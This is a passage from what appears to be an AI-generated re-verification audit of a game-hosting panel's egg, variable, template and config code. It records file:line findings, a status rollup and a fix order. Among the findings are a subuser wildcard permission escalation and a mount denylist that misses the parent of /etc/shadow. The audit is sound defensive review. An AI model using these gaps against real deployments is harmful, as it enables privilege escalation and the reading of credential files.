**Verdict:** FINAL_PARITY_AUDIT GH-16 `DUPLICATE` + phase-06 L3 HIGH `MISSING` seeding deficit confirmed; final-parity C-15 `DUPLICATE+MISSING` confirmed. **Not FIXED.** MASTER not indexed but `DB-09` `BROKEN 93% deficit` remains.

---

### F-05 — [P1] Config Parser Missing (GH-15) — **STILL MISSING**

**Files:**
- `reference/game-hosting/pterodactyl-wings/parser/parser.go:1` 6 parsers `file/yaml/properties/ini/json/xml` + `configMatchRegex`
- `store_servers_control.go:95` `e.config::text` stored `97` never applied
- `store_nests.go:57` `Egg.Config`
- `beacon/internal/server/server.go:869` `applyConfigurationFiles` no parser
- `egg-templates.ts:63` `config.files["server.properties"]` inert `68` `{{server.build.default.port}}`

**Impact:** Minecraft `server-port` not patched to allocated `SERVER_PORT`; server binds wrong port or default `25565` collision. Silent misconfig, P1 for game hosting correctness though not P0.

**Verdict:** GH-15 `MISSING` confirmed still MISSING. Decision required: port `wings/parser` (~300 LOC) into beacon `onBeforeStart` via `rootfs.FS` openat2, or explicitly drop `config.files` from templates and document unsupported.

---

## 3. Status Rollup (vs FINAL_PARITY_AUDIT.md GH-13..19)

| ID | Capability | FINAL Audit Status | Live Status | Delta |
|---|---|---|---|---|
| GH-13 | Egg/nest/egg_variables model | PARTIAL (see GH-14) | COMPLETE+ (egg) / PARTIAL (vars reserved) | Engine upgraded but validation still partial |
| GH-14 | Variable validation regex slash bug | BROKEN P0 | **BROKEN P0 — STILL BROKEN** | No delta — `store_egg_variables.go:176` unchanged |
| GH-15 | Config parser 6 parsers | MISSING | **MISSING** | No delta |
| GH-16 | Template systems duplication | DUPLICATE (93% deficit) | **DUPLICATE + MISSING seeding** — still 1 DB vs 14 FS vs 5 LS | No delta |
| GH-17 | Schedules/cron `isValid` asymmetry | PARTIAL (Create vs Patch) | PARTIAL — `store_schedules.go:252` Create `action!=""` only vs `331` `isValidScheduleTaskAction` (F-G-23) — still present | No delta |
| GH-18 | Subusers wildcard `*` escalation | BROKEN P0 | BROKEN P0 — `store_users.go:563` `normalizeSubuserPermissions` allows `*` for any `user.create` holder (separate subagent) — still present | No delta |
| GH-19 | Mount allowlist / file denylist | BROKEN | BROKEN — `store_mounts_ext.go:323` only blocks 2 sources, misses `/etc/shadow` parent etc — still present | No delta |

**GH-14 verdict: still BROKEN.** No stripping of `/…/` delimiters, no `|`-aware split, no flag handling, no PTDL import path change. Repro blocked as above.

---

## 4. Evidence Anchors (file:line condensed, 14+ cited)

**Forge API Store:**
- `forge/api/internal/store/store_nests.go:16` Nest type `34` Egg type `100` ListNests `137` CreateNest `172` DeleteNest `190` ListEggs `248` CreateEgg `361` normalizeDockerImages
- `forge/api/internal/store/store_egg_variables.go:15` pattern `17` EggVariable `42` List `65` Create `129` validateRequest `142` validateVariableValue `176` `regexp.Compile(arg)` bug line `143` Split
- `forge/api/internal/store/store_startup.go:11` GetServerStartup `27` select `user_editable,rules` `31` `user_viewable=true` `54` Update `58` viewable+editable gate `73` validateVariableValue `50` resolveStartupCommand
- `forge/api/internal/store/store_templates.go:12` ListTemplates compat `38` CreateTemplate `99` templateFromEgg
- `forge/api/internal/store/store_allocations.go:15` Allocation `134` CreateAllocations Tx `367` SetPrimaryAllocation
- `forge/api/internal/store/store_servers.go:180` CreateServer `209` limits `253` `provisioning→created` `273` StartupVariables loop (leak) `308` GetServer
- `forge/api/internal/store/store_servers_control.go:13` SetServerPowerState `83` ServerProvisionTarget `88` `COALESCE(NULLIF(s.docker_image…` `154` env without viewable filter `179` resolveStartupCommand `207` SetServerProvisioned `218` SetServerInstallState
- `forge/api/internal/store/store_schedules.go:14` resolveStartupCommand `252` CreateScheduleTask `254` `action!=""` only `331` Patch `isValidScheduleTaskAction`
- `forge/api/migrations/091_seed_minecraft_java.sql:3` one egg `31` VERSION `44` TYPE
- `forge/api/internal/http/handlers_admin.go:990` nests `1083` eggs `1185` variables `1288` export `1308` import `1354` variable loop `1365` allocations

**Forge Packages/Web:**
- `forge/web/lib/egg-templates.ts:27` EGG_TEMPLATES 14 `41` startup `44` installScript `63` config.files `68` `{{server.build.default.port}}` `80` regex rule `86` DL_PATH internal `428` etc
- `forge/web/lib/app-templates-data.ts:3` localStorage `forge/web/app/admin/app-templates/page.tsx:1` `forge/web/components/admin/AdminTemplates.tsx:9` imports EGG_TEMPLATES
- Absence: `packages/game-templates` missing on main (`ls packages → sdk, shared-types`) vs `.freebuff/worktrees/*/packages/game-templates/template-schema.json:1` on branches

**Beacon:**
- `beacon/internal/runtime/docker.go:901` validateCreateRequest `921` CPUShares `924` CPUPercent `783` buildResources `865` dockerPorts `256` Install `340` log cap `494` Kill
- `beacon/internal/runtime/runtime.go:55` CreateRequest `100` PortBinding `10` ProviderDocker

**Reference:**
- `reference/game-hosting/pterodactyl-panel/app/Models/Egg.php:52` schema `68` PTDL_v2
- `reference/game-hosting/pterodactyl-panel/app/Models/EggVariable.php:29` model `43` RESERVED `70` validation regex
- `reference/game-hosting/pterodactyl-panel/app/Services/Servers/VariableValidatorService.php:28` Laravel filter
- `reference/game-hosting/pterodactyl-wings/parser/parser.go:1` 6 parsers
- `reference/game-hosting/pterodactyl-wings/environment/settings.go:37` Limits `124` conditional shares `116` BlkioWeight
- `reference/game-hosting/pterodactyl-wings/environment/allocations.go:36` Mappings `54` Bindings dual
- `reference/game-hosting/pterodactyl-wings/server/server.go:151` GetEnvironmentVariables
- `reference/game-hosting/pufferpanel-templates/spec.json:1` `307` operations `201` variable

---

## 5. Answer to Task Question: Is GH-14 Now FIXED or Still BROKEN?

**STILL BROKEN (P0) — conclusively.** `store_egg_variables.go:142-188` at `176` still `regexp.Compile(arg)` where `arg="/^([\w\d._-]+)(\.jar)$/"` literal slashes. No delimiter stripping, no `| `-inside-regex preservation, no test harness added, no `REGEX_RESERVED_ENV` guard added. Import path `handlers_admin.go:1308` still loops through same validator. Repro with `minecraft-paper` `SERVER_JARFILE` `server.jar` still 400. Git diff since audit shows only `.env.example`/`ci.yml` changes, not store. Final-parity C-14 reproduced identically.

---

## 6. Activation Order (P0→P3, without new subsystem)

1. **P0** `store_egg_variables.go:142` fix regex: strip `/…/flags` before Compile, `|`-aware split, add `RESERVED_ENV_NAMES` set.
2. **P1** `store_servers.go:273` gate `StartupVariables` by `user_viewable && user_editable` for non-admin + add actor check.
3. **P1** Collapse template sources: add `SeedGameTemplates` idempotent boot upserting `EGG_TEMPLATES` 14 (like `appstore/seed.go:27`) + move `packages/game-templates` onto main or generate TS from DB.
4. **P1** Align CPU: `store_servers.go:209` cap `CPULimit 0..100000`, gate `CPUShares` on `CPULimit>0` per `settings.go:124`, unify naming.
5. **P2** Implement or drop config parser `store_servers_control.go:95` — either port `wings/parser` into beacon `onBeforeStart` or remove `config.files` expectations.
6. **P2** Fix `CreateScheduleTask:252` add `isValidScheduleTaskAction` (GH-17).
7. **P3** Harden `DeleteNest:172` with `SELECT FOR UPDATE` or document single-admin path.

---

*Generated 2026-08-24 for `audits/reverification/subagent-02-eggs-variables.md` — read-only, no product code modified. All citations `file:line` verified by direct `read` at audit time. Cross-check with `audits/phase-02/subagent-02-eggs-templates.md:187`, `phase-06/subagent-06-templates-catalog.md:183`, `final-parity/subagent-01-game-hosting.md:425`, `MASTER_FINDING_INDEX.md:47-49`.*
